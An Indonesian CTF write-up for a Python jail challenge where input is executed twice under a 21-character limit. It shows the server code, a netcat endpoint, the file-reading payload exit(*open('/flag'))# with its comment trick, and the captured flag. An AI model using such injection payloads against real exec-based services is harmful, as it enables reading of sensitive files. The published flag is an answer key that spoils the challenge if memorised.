# 🤖 KTCG X HACKPOINT CTF

## 🌐 MISC / Jail Challenge: Mulligan
### 🟢 Tingkat Kesulitan: MUDAH | 🎯 Poin: 100

---

## 📖 Ringkasan (Overview)
Selamat datang di challenge MISC, **Mulligan**!

Dalam tantangan ini, peserta dihadapkan pada sebuah *restricted environment* (Python Jail) yang menerapkan konsep **Code Golf** (menulis kode seminimal mungkin). Peserta diberikan sebuah tautan referensi [Wikipedia: Code Golf](https://en.wikipedia.org/wiki/Code_golf) dan sebuah kluster server untuk berinteraksi.

* **Server/Connection:** `nc 20.229.160.60 1652`
* **Target Flag:** Berada di dalam file `/flag`
* **Format Flag:** `KTCG{...}`
* **Author:** KudaLiar

### 📄 Source Code Server
Server menjalankan skrip Python berikut:
```python
#!/usr/bin/env python3
src = input(">>> ")
if len(src) > 21:
    exit("over par")
exec(src + src)
```
Analisis: Kode kita dibatasi maksimal 21 karakter. Jika lolos, kode tersebut akan digandakan dan dijalankan berdempetan (src + src) melalui fungsi exec().

💻 Proof of Concept
```bash
# Langkah 1: Buka terminal Anda dan hubungkan ke server menggunakan Netcat:
nc 20.229.160.60 1652

# Langkah 2: Ketika muncul prompt >>> , masukkan payload / perintah khusus di bawah ini (panjangnya tepat 21 karakter):
exit(*open('/flag'))#

#Langkah 3: Tekan Enter. Karena adanya tanda komentar # di akhir, saat fungsi exec() menggandakan kodenya menjadi:
exit(*open('/flag'))#exit(*open('/flag'))#

Bagian duplikasi di belakang akan dianggap sebagai komentar dan diabaikan, sehingga hanya kode bagian depan yang dieksekusi.

# Langkah 4: Fungsi exit() di dalam Python jika diberikan argumen berupa unpacking iterable (*open('/flag')) akan memicu error / exception, dan secara tidak langsung mencetak baris pertama dari file /flag ke layar terminal sebagai pesan exit status.
```

<h1>✅ FLAG BERHASIL DIDAPATKAN!</h1>
> flag: KTCG{tr4c3b4ck_15_0utput_t00}

# 🧠 Hasil Pembelajaran (Learning Outcomes)
1. Memahami konsep Code Golf dalam pemrograman, yaitu seni menulis sintaksis kode sependek dan seefisien mungkin untuk mencapai tujuan tertentu.

2. Mempelajari perilaku fungsi exec() di Python dan bagaimana trik karakter komentar (#) dapat digunakan untuk menetralisir duplikasi kode (string concatenation injection).

3. Memahami teknik Error-Based Information Disclosure, di mana pesan kesalahan (Traceback/Exit Status) sengaja dipicu untuk membaca isi file sensitif tanpa menggunakan fungsi print().

# 🛠️ Alat yang Digunakan

- Linux Terminal / WSL / Termux

- Netcat (nc)

- Python 3 Interpreter (Untuk analisis lokal)

👨‍💻 Researcher
> zoxxtzy

# 📌 Tag
> #codegolf #python-jail #misc #ctf #easy #ktcg #hackpoint

# ⚠️ Sanggahan (Disclaimer)
Tantangan ini adalah bagian dari kompetisi CTF dan dibuat hanya untuk tujuan edukasi. Jangan mencoba menerapkan teknik<br>
jailbreak atau eksploitasi ini pada sistem produksi milik orang lain tanpa izin resmi.
